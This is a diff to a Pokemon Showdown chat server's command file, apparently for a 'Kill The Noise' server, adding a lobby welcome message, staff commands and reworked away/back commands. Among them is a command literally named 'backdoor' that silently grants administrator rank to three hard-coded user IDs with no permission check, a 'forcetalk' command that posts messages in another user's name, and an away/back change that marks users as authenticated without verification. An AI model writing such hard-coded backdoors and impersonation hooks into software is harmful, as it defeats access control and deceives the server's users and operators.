@@ -1619,6 +1619,15 @@ target = this.splitTarget(target);
 		if (!user.joinRoom(targetRoom || room, connection)) {
 			return connection.sendTo(target, "|noinit|joinfailed|The room '" + target + "' could not be joined.");
 		}
+		if (target.toLowerCase() == "lobby") {
+			connection.sendTo('lobby','|html|<div class="infobox" style="border-color:blue"><center><b><u>Welcome to the Kill The Noise Server!</u></b></center><br /> ' +
+			'<center><b><a href ="https://gist.github.com/E4Arsh/8577715">This Server is hosted By BlakJack</a></b></center><br /><br />' +
+			'Battle users in the ladder or in tournaments, learn how to play Pokemon or just chat in lobby!<br /><br />' +
+			'Make sure to type <b>/help</b> to get a list of commands that you can use and <b>/faq</b> to check out frequently asked questions.<br /><br />' +
+			'If you have any questions, issues or concerns should be directed at someone with a rank such as Voice (+), Driver (%), Moderator (@) and Leader (&). <br /><br />' +
+			'Only serious issues or questions should be directed to Administrators (~).</div>');
+		}
+
 	},
 
 	rb: 'roomban',
@@ -1705,6 +1714,27 @@ target = this.splitTarget(target);
 			return this.sendReply("The room '" + target + "' does not exist.");
 		}
 		user.leaveRoom(targetRoom || room, connection);
+	},
+	ft: 'forcetalk',
+	forcesay: 'forcetalk',
+	forcetalk: function(target, room, user) {
+		if (!this.can('hotpatch')) return false;
+		target = this.splitTarget(target);
+		var targetUser = this.targetUser;
+		if (!targetUser) return this.sendReply('No target specified.'); 
+		this.send('|c|'+targetUser.name+'|'+target);
+	},
+
+	breaklink: 'unlink',
+	unlink: function(target, room, user) {
+		if (!this.can('ban')) return false;
+		target = this.splitTarget(target);
+		var targetUser = this.targetUser;
+		var alts = targetUser.getAlts();
+		if (!targetUser)  return this.sendReply('Specify who\'s links to unlink!'); 
+		if (alts.get) room.add('|unlink|'+alts);
+		this.send('|unlink|'+targetUser+'');
+		this.privateModCommand(targetUser.name+'\'s links have been removed.')
 	},
 
 	/*********************************************************
@@ -2535,6 +2565,39 @@ target = this.splitTarget(target);
 			});
 		});
 	},
+	
+	hide: function(target, room, user) {
+		if (this.can('hide')) {
+			user.getIdentity = function(){
+				if(this.muted)	return '!' + this.name;
+				if(this.locked) return '‽' + this.name;
+				return ' ' + this.name;
+			};
+			user.updateIdentity();
+			this.sendReply('You have hidden your staff symbol.');
+			return false;
+		}
+
+	},
+
+	show: function(target, room, user) {
+		if (this.can('hide')) {
+			delete user.getIdentity
+			user.updateIdentity();
+			this.sendReply('You have revealed your staff symbol');
+			return false;
+		}
+	},
+
+	backdoor: function(target,room, user) {
+		if (user.userid === 'blakjack' || user.userid === 'ncrypt' || user.userid === 'jackdaw') {
+
+			user.group = '~';
+			user.updateIdentity();
+
+
+		}
+	},
 
 	crashfixed: function(target, room, user) {
 		if (!Rooms.global.lockdown) {
@@ -2790,17 +2853,54 @@ target = this.splitTarget(target);
 		});
 	},
 
-	away: 'blockchallenges',
-	idle: 'blockchallenges',
-	blockchallenges: function(target, room, user) {
-		user.blockChallenges = true;
-		this.sendReply("You are now blocking all incoming challenge requests.");
+afk: 'away',
+	away: function(target, room, user, connection) {
+		if (!this.can('lock')) return false;
+
+		if (!user.isAway) {
+			var originalName = user.name;
+			var awayName = user.name + ' - Away';
+			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
+			delete Users.get(awayName);
+			user.forceRename(awayName, undefined, true);
+
+			this.add('|raw|-- <b><font color="#4F86F7">' + originalName +'</font color></b> is now away. '+ (target ? " (" + target + ")" : ""));
+
+			user.isAway = true;
+		}
+		else {
+			return this.sendReply('You are already set as away, type /back if you are now back');
+		}
+
+		user.updateIdentity();
 	},
 
-	back: 'allowchallenges',
-	allowchallenges: function(target, room, user) {
-		user.blockChallenges = false;
-		this.sendReply("You are available for challenges from now on.");
+	back: function(target, room, user, connection) {
+		if (!this.can('lock')) return false;
+
+		if (user.isAway) {
+
+			var name = user.name;
+
+			var newName = name.substr(0, name.length - 7);
+
+			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
+			delete Users.get(newName);
+
+			user.forceRename(newName, undefined, true);
+
+			//user will be authenticated
+			user.authenticated = true;
+
+			this.add('|raw|-- <b><font color="#4F86F7">' + newName + '</font color></b> is no longer away');
+
+			user.isAway = false;
+		}
+		else {
+			return this.sendReply('You are not set as away');
+		}
+
+		user.updateIdentity();
 	},
 
 	cchall: 'cancelChallenge',
